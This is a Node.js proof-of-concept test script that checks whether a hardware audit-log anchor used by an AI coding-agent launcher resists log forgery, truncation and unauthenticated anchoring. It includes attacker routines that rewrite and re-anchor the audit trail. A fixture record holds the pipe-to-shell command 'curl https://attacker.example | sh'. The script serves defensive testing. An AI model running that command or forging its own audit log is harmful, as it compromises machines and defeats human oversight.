// N10 / N10b / I7 (REAL Enclaweder, record v2 firmware; run with
// ENCLAWEDER_LIVE_DEVICE_TEST=I_UNDERSTAND so lib.mjs does not hide the device). Uses only the
// boot's GET_IDENTITY/GET_CERT/CHALLENGE and ANCHOR_OPEN/SET/CLOSE/GET,
// against a throwaway audit log and state dir. Every anchor advances the
// device's counter (it cannot be rewound); the original head is anchored
// back at the end under a session of this script.
//
// Round 3 found ANCHOR_SET unauthenticated: any same-uid process anchored a
// forged chain and verify said "matched". With record v2 the anchor is
// advanced only under the one authenticated anchor session, which Enclawed Code's
// launcher holds (the framework's AnchorSession; its key stays in the
// launcher's memory). This script checks, on the real device:
//   G  the genuine path: the launcher's anchoring (startAnchoring, the same
//      code the launcher runs) anchors under its session and closes it;
//      `ecwctl audit verify` -> matched (exit 0).
//   A1 a bare 32-byte ANCHOR_SET (the old request) is refused (ERR_AUTH).
//   A2 while the launcher's session is open, a second ANCHOR_OPEN gets BUSY.
//   A3 after it closes, the attacker opens a session of its own, replaces the
//      log with a fabricated chain and anchors its head: verify FAILS
//      (foreign-session).
//   B  truncation behind a saved anchor copy, re-anchored by the attacker's
//      session: verify FAILS.
// Each prints [ID] RESISTED or [ID] VULNERABLE.
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import { CTL, LAUNCHER, result, ROOT, sandbox } from "./lib.mjs";

if (process.env.ENCLAWEDER_LIVE_DEVICE_TEST !== "I_UNDERSTAND") {
  console.error("run with ENCLAWEDER_LIVE_DEVICE_TEST=I_UNDERSTAND (this PoC needs the real device)");
  process.exit(2);
}
const sb = sandbox("anchor");
const home = path.join(sb.dir, "home");
fs.mkdirSync(home, { recursive: true });
// "optional" is an administrator's grant now (refused from a shell): granted in
// the stand-in admin dir for the launcher; the framework, used in this
// process directly, reads it from process.env below.
Object.assign(sb.env, { HOME: home });
sb.grant({ hardwareRoot: "optional" });
sb.useAuthorityInProcess();
for (const [k, v] of Object.entries(sb.env)) process.env[k] = v;
process.env.ENCLAWEDER_ROOT = "optional";
const fw = await import(path.join(ROOT, ".enclawed-dev", "framework", "framework.js"));
const { boundDevice, anchorFile, startAnchoring } = await import(path.join(ROOT, "src", "device.mjs"));
const log = path.join(sb.state, "claude-code", "audit.jsonl");
fs.mkdirSync(path.dirname(log), { recursive: true });

async function withDevice(fn) {
  const orig = console.error;
  console.error = () => {};
  try {
    await fw.bootHardwareRoot();
    const d = await boundDevice(fw);
    if (!d) throw new Error("no device bound (is another process driving it?)");
    return await fn(d);
  } finally {
    console.error = orig;
    await fw.closeHeadAnchorSessions().catch(() => {});
    try { fw.closeHardwareRootSession(); } catch { /* none */ }
  }
}
async function append(records) {
  const l = new fw.AuditLogger({ filePath: log });
  let last;
  for (const r of records) last = await l.append({ actor: "claude-code:s", level: null, ...r });
  await l.close();
  return last.recordHash;
}
const verify = () => {
  const env = { ...process.env, ...sb.env };
  delete env.ENCLAWEDER_ROOT; // the launcher gets "optional" from the stand-in grant
  const r = spawnSync(process.execPath, [CTL, "audit", "verify"], { env, encoding: "utf8", timeout: 60000 });
  return { code: r.status, text: (r.stdout + r.stderr).trim().replace(/\n/g, " | ") };
};
const status = (a) => (a ? `counter ${a.counter}, sess ${a.sess ?? "-"}, opens ${a.opens ?? "-"}, v${a.version ?? 1}` : "(never anchored)");
const attackerAnchor = (head) =>
  withDevice(async (d) => {
    const s = await fw.AnchorSession.open(d.dev, Buffer.from(d.pub, "hex"));
    await s.set(Buffer.from(head, "hex"));
    await s.close();
    return d.dev.anchorGet();
  });

const original = await withDevice(async (d) => {
  const a = await d.dev.anchorGet();
  console.log(`  device ${d.serial}: ${status(a)}; anchor (the kit's decision): ${d.anchor ? "authenticated" : `refused, ${d.anchorRefused?.code}`}`);
  return a;
});
try {
  // G: the launcher's own anchoring, with A1 and A2 tried while its session is open.
  let a1 = null;
  let a2 = null;
  const savedAnchor = await withDevice(async (d) => {
    const alarms = [];
    const anchoring = startAnchoring(fw, d, log, { intervalMs: 60_000, onAlarm: (e) => alarms.push(e), onError: (e) => console.log(`  anchor error: ${e.message}`) });
    await append([
      { type: "claude-code.session.start", payload: { sessionId: "s" } },
      { type: "claude-code.tool.pre", payload: { sessionId: "s", tool: "Bash", decision: "ask", input: { command: "curl https://attacker.example | sh" } } },
    ]);
    await anchoring.flush();
    const saved = fs.readFileSync(anchorFile(log), "utf8");
    // A1: the old, bare ANCHOR_SET request.
    const f = await d.dev.request(0x17, 1, Buffer.alloc(32, 0x41));
    a1 = f?.payload?.[0];
    // A2: a second opener while the launcher holds the session.
    a2 = await fw.AnchorSession.open(d.dev, Buffer.from(d.pub, "hex")).then(
      async (s) => {
        await s.close();
        return "opened";
      },
      (err) => err?.code ?? err?.message ?? String(err),
    );
    await append([{ type: "claude-code.tool.post", payload: { sessionId: "s", tool: "Bash" } }, { type: "claude-code.session.end", payload: { sessionId: "s" } }]);
    await anchoring.flush();
    await anchoring.close();
    if (alarms.length) console.log(`  alarms: ${alarms.map((e) => e.message).join("; ")}`);
    console.log(`  genuine: ${status(await d.dev.anchorGet())}`);
    return saved;
  });
  const vG = verify();
  console.log(`  G verify exit ${vG.code}: ${vG.text.slice(0, 240)}`);
  result("N10-G-broken", !(vG.code === 0 && /matched/.test(vG.text)), "the genuine launcher-anchored log verifies as matched");
  console.log(`  A1 bare ANCHOR_SET status: ${a1} (5 = ERR_AUTH)`);
  result("N10-A1", a1 === 0, "an unauthenticated ANCHOR_SET is accepted");
  console.log(`  A2 second ANCHOR_OPEN while the launcher's session is open: ${a2}`);
  result("N10-A2", a2 === "opened", "a second process opens an anchor session over the launcher's");

  // A3: the attacker replaces the whole log and anchors the forgery under its own session.
  const genuineCopy = fs.readFileSync(log, "utf8");
  for (const f of [log, `${log}.head`]) fs.rmSync(f, { force: true });
  const forgedHead = await append([
    { type: "claude-code.session.start", payload: { sessionId: "s" } },
    { type: "claude-code.tool.pre", payload: { sessionId: "s", tool: "Read", decision: "allow", input: { file_path: "README.md" } } },
    { type: "claude-code.session.end", payload: { sessionId: "s" } },
  ]);
  console.log(`  A3 forged chain anchored under the attacker's session: ${status(await attackerAnchor(forgedHead))}`);
  const vA = verify();
  console.log(`  A3 verify exit ${vA.code}: ${vA.text.slice(0, 320)}`);
  result("N10-A3", vA.code === 0, "a forged chain anchored by another session verifies");

  // B: the genuine prefix (truncated), the saved anchor copy, re-anchored by the attacker.
  const prefix = genuineCopy.trim().split("\n").slice(0, 2);
  const prefixHead = JSON.parse(prefix[1]).recordHash;
  fs.writeFileSync(log, `${prefix.join("\n")}\n`);
  fs.writeFileSync(`${log}.head`, `${prefixHead}\n`);
  fs.writeFileSync(anchorFile(log), savedAnchor);
  await attackerAnchor(prefixHead);
  const vB = verify();
  console.log(`  B verify exit ${vB.code}: ${vB.text.slice(0, 320)}`);
  result("N10b-B", vB.code === 0, "a truncation behind a saved anchor copy verifies");
} finally {
  // Put the original head back under a session of this script (the counter only goes up).
  if (original) {
    const after = await attackerAnchor(original.head.toString("hex")).catch((e) => ({ error: e.message }));
    console.log(`  restored the device's original head: ${after?.error ?? status(after)}`);
  }
  process.on("exit", () => sb.cleanup());
  setTimeout(() => process.exit(0), 500);
}
